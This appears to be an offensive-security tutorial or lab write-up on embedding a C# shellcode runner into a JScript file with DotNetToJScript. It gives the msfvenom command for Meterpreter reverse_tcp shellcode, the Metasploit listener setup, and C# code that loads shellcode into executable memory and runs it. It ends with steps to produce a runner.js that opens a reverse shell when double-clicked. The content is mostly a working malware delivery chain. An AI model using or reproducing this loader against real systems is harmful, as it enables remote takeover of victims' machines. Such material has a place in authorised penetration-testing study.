## **Jscript Shellcode Runner**
    
  embedding **C# shellcode runner** into Jscript using **DotNetToJscript**.

  ### Step 1: **Create shellcode**
  
  - Generate **64-bit shellcode** 

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.2.142 LPORT=4444 -f csharp
    ```
      
  - start listner
        
    ```bash
    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.2.142; set LPORT 4444; run"
    ``` 
  - copy the full byte array (`buf`).
 
  ### Step 2: **Create a New Project**
  
  1. Open **Visual Studio**.
  2. Go to **File → New → Project**.
  3. Select:
      - **Class Library (.NET Framework)** (not Console App).
      - Choose **.NET Framework 4.x** (DotNetToJScript works best with .NET 4).
  4. Name it `ExampleAssembly`.
  5. Click **Create**.
  
  ### Step 3: Modify ExampleAssembly (C#)
  
  Add imports & execution logic in `TestClass`:
  
  ```jsx
  using System;
  using System.Diagnostics;
  using System.Runtime.InteropServices;
  
  [ComVisible(true)]
  public class TestClass
  {
      [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
      static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
  
      [DllImport("kernel32.dll")]
      static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
      [DllImport("kernel32.dll")]
      static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
      public TestClass()
      {
            byte[] buf = new byte[626] {0xfc,0x48,0x83,0xe4,0xf0,0xe8...};
      
            int size = buf.Length;
      
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);		
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
      }
      
  }
  
  ```
  
  ### Step 4: Compile as x64
  
  - Ensure **platform = x64**.
  - Copy compiled DLL to [DotNetToJscript release](https://github.com/tyranid/DotNetToJScript/releases/download/v1.0.4/release_v1.0.4.7z) folder.
  
  ### Step 4: Generate Jscript Payload
  
  ```jsx
  .\DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
  ```
  
  ### Step 5: Execution
  
  - Double-click `runner.js`.
  - Spawns **Meterpreter reverse shell** after a short delay.
    <img width="1411" height="275" alt="image" src="https://github.com/user-attachments/assets/368b3511-72bd-4002-9d3d-5c86751d0030" />
